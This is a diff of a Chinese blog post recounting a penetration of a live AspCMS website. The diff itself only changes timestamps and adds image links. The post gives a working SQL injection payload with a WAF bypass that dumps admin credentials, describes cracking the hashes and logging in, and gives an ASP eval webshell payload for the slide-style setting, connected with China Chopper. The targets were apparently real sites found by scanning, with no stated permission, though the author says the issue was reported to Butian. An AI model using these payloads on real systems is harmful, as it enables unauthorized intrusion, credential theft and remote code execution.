@@ -28,7 +28,7 @@
 <meta property="og:description" content="真实的渗透经历">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2020-10-20T07:43:25.000Z">
-<meta property="article:modified_time" content="2020-10-20T08:15:19.146Z">
+<meta property="article:modified_time" content="2020-10-20T08:22:39.020Z">
 <meta property="article:author" content="f1oat">
 <meta name="twitter:card" content="summary">
 
@@ -184,7 +184,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2020-10-20 15:43:25 / Modified: 16:15:19" itemprop="dateCreated datePublished" datetime="2020-10-20T15:43:25+08:00">2020-10-20</time>
+              <time title="Created: 2020-10-20 15:43:25 / Modified: 16:22:39" itemprop="dateCreated datePublished" datetime="2020-10-20T15:43:25+08:00">2020-10-20</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -209,7 +209,10 @@
       
         <h2 id="真实的渗透经历"><a href="#真实的渗透经历" class="headerlink" title="真实的渗透经历"></a>真实的渗透经历</h2><a id="more"></a>
 
-<h4 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h4><pre><code><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">因为新生培训，最近重学了一波owsap top10的基础内容，然后想着现在运行的站是不是没有sql注入利用的洞了?</span><br><span class="line">后来看到aspcms框架的漏洞，发现还真有sql的洞，于是就去找哪些还在运行的aspcms的网站，后来找到了，于是试了试payload:</span><br><span class="line">/plug/comment/commentList.asp?id=0<span class="comment">%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now%28%29,null,1%20%20frmasterom%20&#123;prefix&#125;user</span></span><br><span class="line">对这个payload的解释其实进行urldecode之后就变成了：</span><br><span class="line">/plug/comment/commentList.asp?id=0 unmasterion semasterlect top 1 UserID,GroupID,LoginName,Password,now(),null,1  frmasterom &#123;prefix&#125;user</span><br><span class="line">在仔细一看union select top 1 ....就是查数据的sql，只不过利用了waf对于master的单层过滤bypass了，于是爆出了admin以及md5加密过后的密码，admin的密码太难破解了，于是乎，我又看了看sql的payload，发现top 5能够爆出其他数据，于是尝试破解其他的md5值，结果成功破解了超级管理员用户的密码</span><br><span class="line">对域名进行信息收集，获取了后台管理界面的url，利用爆出的数据成功登录</span><br><span class="line"></span><br></pre></td></tr></table></figure></code></pre>
+<h4 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h4><pre><code><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">因为新生培训，最近重学了一波owsap top10的基础内容，然后想着现在运行的站是不是没有sql注入利用的洞了?</span><br><span class="line">后来看到aspcms框架的漏洞，发现还真有sql的洞，于是就去找哪些还在运行的aspcms的网站，后来找到了，于是试了试payload:</span><br><span class="line">/plug/comment/commentList.asp?id=0<span class="comment">%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now%28%29,null,1%20%20frmasterom%20&#123;prefix&#125;user</span></span><br><span class="line">对这个payload的解释其实进行urldecode之后就变成了：</span><br><span class="line">/plug/comment/commentList.asp?id=0 unmasterion semasterlect top 1 UserID,GroupID,LoginName,Password,now(),null,1  frmasterom &#123;prefix&#125;user</span><br><span class="line">在仔细一看union select top 1 ....就是查数据的sql，只不过利用了waf对于master的单层过滤bypass了，于是爆出了admin以及md5加密过后的密码，admin的密码太难破解了，于是乎，我又看了看sql的payload，发现top 5能够爆出其他数据，于是尝试破解其他的md5值，结果成功破解了超级管理员用户的密码</span><br><span class="line">对域名进行信息收集，获取了后台管理界面的url，利用爆出的数据成功登录</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+![展示](https://yueqsun.github.io/images/example.png)
+![展示](https://yueqsun.github.io/images/example2.jpg)
+![展示](https://yueqsun.github.io/images/example3.jpg)</code></pre>
 <h4 id="web的信息"><a href="#web的信息" class="headerlink" title="web的信息"></a>web的信息</h4><pre><code><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iis10.0 windows的服务器，因为ii7.5以上的版本就已经把解析漏洞给修复了</span><br><span class="line">所以不能利用解析漏洞写入shell</span><br></pre></td></tr></table></figure></code></pre>
 <h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><pre><code><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在aspcms漏洞信息上，发现了一个应该是存储xss的方式写入shell</span><br><span class="line">在管理页面的扩展功能下找到幻灯片设置将前端slidestyle 的value改成</span><br><span class="line">1<span class="comment">%&gt;&lt;%Eval(Request (chr(83)))%&gt;&lt;%</span></span><br><span class="line">保存，即可写入shell，利用菜刀连接，成功拿到shell</span><br></pre></td></tr></table></figure></code></pre>
 <h4 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h4><pre><code><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">已经提交至补天，等待一下后续结果吧</span><br></pre></td></tr></table></figure></code></pre>
